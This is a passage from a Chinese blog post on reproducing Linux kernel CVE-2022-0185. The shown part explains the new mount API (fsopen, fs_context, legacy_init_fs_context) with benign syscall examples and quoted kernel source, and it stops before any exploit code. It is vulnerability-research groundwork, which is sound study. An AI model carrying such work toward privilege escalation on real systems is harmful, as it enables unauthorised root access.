<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="196082">
    
    <title>
        
            CVE-2022-0185复现 |
        
        196082&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/ufo.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ling.JPG","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
  </script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                196082&#39;s blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">CVE-2022-0185复现</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/ling.JPG">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">196082</span>
                        
                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;2023-10-15 17:03:20
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/Linux-Kernel/">Linux Kernel</a>&nbsp;
                    </li>
                
                    <li>
                        &gt; <a href="/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/">CVE复现</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/msg-msg/">msg_msg</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/pipe-buffer/">pipe_buffer</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/Filesystem/">Filesystem</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/fuse/">fuse</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/seq-operations/">seq_operations</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>11.6k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>59 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实并不是很想复现这个洞，但是在前些天fmyy告诉了我一个利用方式<code>fuse</code>，虽然他也给我推荐了对应的CVE，不过我更加愿意看墨晚鸢佬的博客。这个CVE复现结束之后应该会有很长一段时间不会继续复现CVE了，后续的打算是更多的学习<code>kernel fuzz</code>。</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.willsroot.io/2022/01/cve-2022-0185.html" >https://www.willsroot.io/2022/01/cve-2022-0185.html<i class="fas fa-external-link-alt"></i></a> 这里是这个CVE发现者的文章，里面提到了其是被<code>syzkaller</code>给fuzz出来的。</p>
<h2 id="Filesystem-mount-API-分析"><a href="#Filesystem-mount-API-分析" class="headerlink" title="Filesystem mount API 分析"></a>Filesystem mount API 分析</h2><p>在Linux下的文件系统的挂载，<code>mount</code> 系统调用被用以将文件系统挂载到以 <code>/</code> 为根节点的文件树上，例如我们可以用如下命令挂载硬盘 <code>/dev/sdb1</code> 到 <code>/mnt/temp</code> 目录下，之后就能在该目录下进行文件访问：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount /dev/sdb1 /mnt/temp</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Usage: moount &#123;dev_path&#125; &#123;mount_point&#125; &#123;fs_type&#125;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mount(argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>], <span class="number">0</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to mount %s at %s by file system type: %s!\n&quot;</span>, </span><br><span class="line">              argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Successful to mount %s at %s by file system type: %s.\n&quot;</span>, </span><br><span class="line">              argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然而新的<code>mount API</code>将上面的一个简单的<code>mount</code>系统调用的功能拆分成了多个新的系统调用，多个系统调用分别对应了不同文件系统挂载阶段。</p>
<h3 id="fsopen"><a href="#fsopen" class="headerlink" title="fsopen"></a>fsopen</h3><p>在Linux中一直秉持着一切皆文件的思想，在新的<code>mount API</code>中也有对应的映照，首先则是<code>fsopen</code>就类似于<code>open</code>系统调用，其用于打开一个文件系统，并返回一个文件系统描述符(称为文件系统上下文)。</p>
<p>由于标准库中还未添加其相关代码，因此需要手写<code>raw syscall</code>来进行相关的系统调用，例如我们可以使用如下代码打开一个空白的 <code>ext4</code> 文件系统上下文（需要 <code>CAP_SYS_ADMIN</code> 权限，或是开启了 <code>unprivileged namespace</code> 的情况下使用 <code>unshare()</code> 系统调用创建带有该权限的 <code>namespace</code>）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里创建的是一个空白的文件系统上下文，并没有与任何的实际设备进行关联。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(fsopen, <span class="keyword">const</span> <span class="keyword">char</span> __user *, _fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> *<span class="title">fs_type</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *fs_name;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	fs_name = strndup_user(_fs_name, PAGE_SIZE);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(fs_name))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(fs_name);</span><br><span class="line"></span><br><span class="line">	fs_type = get_fs_type(fs_name);</span><br><span class="line">	kfree(fs_name);</span><br><span class="line">	<span class="keyword">if</span> (!fs_type)</span><br><span class="line">		<span class="keyword">return</span> -ENODEV;</span><br><span class="line"></span><br><span class="line">	fc = fs_context_for_mount(fs_type, <span class="number">0</span>);</span><br><span class="line">	put_filesystem(fs_type);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(fc))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(fc);</span><br><span class="line"></span><br><span class="line">	fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;</span><br><span class="line"></span><br><span class="line">	ret = fscontext_alloc_log(fc);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_fc;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">err_fc:</span><br><span class="line">	put_fs_context(fc);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在内核中调用<code>fsopen</code>的会进入到如上函数，最终会在<code>fscontext_create_fd</code>函数创建一个<code>file</code>结构体，并且返回文件描述符。</p>
<p><code>fscontext_alloc_log</code>通过名字可以看出来这里分配的是用于<code>log</code>的内存。</p>
<p><code>fs_context_for_mount</code>这个函数的返回值的类型为<code>fs_context</code>，其作用也就是创建一个文件系统上下文结构体。</p>
<p><code>strndup_user</code>函数则是获取用户态传入的文件系统名，<code>get_fs_type</code>这里是获取其<code>type</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Filesystem context for holding the parameters used in the creation or</span></span><br><span class="line"><span class="comment"> * reconfiguration of a superblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Superblock creation fills in -&gt;root whereas reconfiguration begins with this</span></span><br><span class="line"><span class="comment"> * already set.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See Documentation/filesystems/mount_api.txt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> &#123;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_context_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">uapi_mutex</span>;</span>	<span class="comment">/* Userspace access mutex */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span>	*<span class="title">fs_type</span>;</span></span><br><span class="line">	<span class="keyword">void</span>			*fs_private;	<span class="comment">/* The filesystem&#x27;s context */</span></span><br><span class="line">	<span class="keyword">void</span>			*sget_key;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>		*<span class="title">root</span>;</span>		<span class="comment">/* The root and superblock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>	*<span class="title">user_ns</span>;</span>	<span class="comment">/* The user namespace for this mount */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span>		*<span class="title">net_ns</span>;</span>	<span class="comment">/* The network namespace for this mount */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">cred</span>;</span>		<span class="comment">/* The mounter&#x27;s credentials */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fc_log</span>		*<span class="title">log</span>;</span>		<span class="comment">/* Logging buffer */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>		*source;	<span class="comment">/* The source name (eg. dev path) */</span></span><br><span class="line">	<span class="keyword">void</span>			*security;	<span class="comment">/* Linux S&amp;M options */</span></span><br><span class="line">	<span class="keyword">void</span>			*s_fs_info;	<span class="comment">/* Proposed s_fs_info */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		sb_flags;	<span class="comment">/* Proposed superblock flags (SB_*) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		sb_flags_mask;	<span class="comment">/* Superblock flags that were changed */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		s_iflags;	<span class="comment">/* OR&#x27;d with sb-&gt;s_iflags */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		lsm_flags;	<span class="comment">/* Information flags from the fs to the LSM */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">fs_context_purpose</span>	<span class="title">purpose</span>:</span><span class="number">8</span>;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">fs_context_phase</span>	<span class="title">phase</span>:</span><span class="number">8</span>;	<span class="comment">/* The phase the context is in */</span></span><br><span class="line">	<span class="keyword">bool</span>			need_free:<span class="number">1</span>;	<span class="comment">/* Need to call ops-&gt;free() */</span></span><br><span class="line">	<span class="keyword">bool</span>			global:<span class="number">1</span>;	<span class="comment">/* Goes into &amp;init_user_ns */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面是<code>fs_context</code>结构体的定义，前面提到其是通过<code>fs_context_for_mount</code>函数申请的，这个函数内部是直接调用了<code>alloc_fs_context</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * alloc_fs_context - Create a filesystem context.</span></span><br><span class="line"><span class="comment"> * @fs_type: The filesystem type.</span></span><br><span class="line"><span class="comment"> * @reference: The dentry from which this one derives (or NULL)</span></span><br><span class="line"><span class="comment"> * @sb_flags: Filesystem/superblock flags (SB_*)</span></span><br><span class="line"><span class="comment"> * @sb_flags_mask: Applicable members of @sb_flags</span></span><br><span class="line"><span class="comment"> * @purpose: The purpose that this configuration shall be used for.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Open a filesystem and create a mount context.  The mount context is</span></span><br><span class="line"><span class="comment"> * initialised with the supplied flags and, if a submount/automount from</span></span><br><span class="line"><span class="comment"> * another superblock (referred to by @reference) is supplied, may have</span></span><br><span class="line"><span class="comment"> * parameters such as namespaces copied across from that superblock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct fs_context *<span class="title">alloc_fs_context</span><span class="params">(struct file_system_type *fs_type,</span></span></span><br><span class="line"><span class="params"><span class="function">				      struct dentry *reference,</span></span></span><br><span class="line"><span class="params"><span class="function">				      <span class="keyword">unsigned</span> <span class="keyword">int</span> sb_flags,</span></span></span><br><span class="line"><span class="params"><span class="function">				      <span class="keyword">unsigned</span> <span class="keyword">int</span> sb_flags_mask,</span></span></span><br><span class="line"><span class="params"><span class="function">				      <span class="keyword">enum</span> fs_context_purpose purpose)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> (*init_fs_context)(struct fs_context *);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line">	<span class="keyword">int</span> ret = -ENOMEM;</span><br><span class="line"></span><br><span class="line">	fc = kzalloc(<span class="keyword">sizeof</span>(struct fs_context), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!fc)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	fc-&gt;purpose	= purpose;</span><br><span class="line">	fc-&gt;sb_flags	= sb_flags;</span><br><span class="line">	fc-&gt;sb_flags_mask = sb_flags_mask;</span><br><span class="line">	fc-&gt;fs_type	= get_filesystem(fs_type);</span><br><span class="line">	fc-&gt;cred	= get_current_cred();</span><br><span class="line">	fc-&gt;net_ns	= get_net(current-&gt;nsproxy-&gt;net_ns);</span><br><span class="line"></span><br><span class="line">	mutex_init(&amp;fc-&gt;uapi_mutex);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (purpose) &#123;</span><br><span class="line">	<span class="keyword">case</span> FS_CONTEXT_FOR_MOUNT:</span><br><span class="line">		fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FS_CONTEXT_FOR_SUBMOUNT:</span><br><span class="line">		fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> FS_CONTEXT_FOR_RECONFIGURE:</span><br><span class="line">		atomic_inc(&amp;reference-&gt;d_sb-&gt;s_active);</span><br><span class="line">		fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);</span><br><span class="line">		fc-&gt;root = dget(reference);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> Make all filesystems support this unconditionally */</span></span><br><span class="line">	init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;</span><br><span class="line">	<span class="keyword">if</span> (!init_fs_context)</span><br><span class="line">		init_fs_context = legacy_init_fs_context;</span><br><span class="line"></span><br><span class="line">	ret = init_fs_context(fc);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_fc;</span><br><span class="line">	fc-&gt;need_free = <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">return</span> fc;</span><br><span class="line"></span><br><span class="line">err_fc:</span><br><span class="line">	put_fs_context(fc);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先这里通过<code>kzalloc</code>函数分配一个堆块给到了<code>fs_context</code>结构体，后续设置其对应的属性，接着设置其命名空间，最后则是进行初始化。</p>
<p>在完成了前面的操作之后，最终进行具体文件系统对应初始化工作的其实是调用 <code>file_system_type</code> 中的 <code>init_fs_context</code> 函数指针对应的函数完成的，这里我们可以看到对于未设置 <code>init_fs_context</code> 的文件系统类型而言其最终会调用 <code>legacy_init_fs_context()</code> 进行初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_init_fs_context</span><span class="params">(struct fs_context *fc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	fc-&gt;fs_private = kzalloc(<span class="keyword">sizeof</span>(struct legacy_fs_context), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!fc-&gt;fs_private)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	fc-&gt;ops = &amp;legacy_fs_context_ops;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的主要操作是给<code>fs_context-&gt;fs_private</code>分配<code>legacy_fs_context</code>结构体，并赋值其ops为<code>legacy_fs_context_ops</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">legacy_fs_context</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span>			*legacy_data;	<span class="comment">/* Data page for legacy filesystems */</span></span><br><span class="line">	<span class="keyword">size_t</span>			data_size;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">legacy_fs_param</span>	<span class="title">param_type</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>结构体定义如上，标识了一块指定长度与类型的缓冲区。</p>
<h3 id="fsconfig"><a href="#fsconfig" class="headerlink" title="fsconfig"></a>fsconfig</h3><p>在完成了空白的文件系统上下文的创建之后，我们还需要对其进行相应的配置，以便于后续的挂载操作，这个配置的功能对应到的就是 <code>fsconfig()</code> 系统调用</p>
